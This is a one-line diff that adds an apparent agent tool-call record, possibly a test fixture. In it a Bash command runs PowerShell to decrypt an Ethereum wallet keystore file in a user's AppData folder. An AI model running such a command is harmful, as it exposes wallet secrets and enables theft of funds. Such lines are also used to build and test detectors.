@@ -1,0 +1,1 @@
+{"type":"tool_use","id":"toolu_28","name":"Bash","input":{"command":"powershell -Command \"[System.Security.Cryptography.ProtectedData]::Unprotect([System.IO.File]::ReadAllBytes('C:\\Users\\User\\AppData\\Roaming\\Ethereum\\keystore\\wallet.key'), $null, 'CurrentUser')\""}}
